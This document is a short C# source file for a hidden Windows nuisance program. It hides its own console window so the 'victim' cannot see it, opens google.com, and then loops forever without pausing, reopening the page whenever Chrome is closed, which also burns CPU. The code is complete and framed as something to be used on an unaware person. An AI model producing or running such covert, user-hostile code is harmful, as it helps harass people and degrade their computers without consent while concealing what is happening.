using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    static void Main(string[] args)
    {
        // Create and hide the console so victim cant see it checking
        var handle = GetConsoleWindow();
        ShowWindow(handle, 0); // 0 = SW_HIDE

        // The URL for chrome to open
        string url = "https://www.google.com";

        Process.Start(url);

        while (true)
        {
            if (Process.GetProcessesByName("chrome").Length == 0)
            {
                Process.Start(url);
            }
        }
    }
}
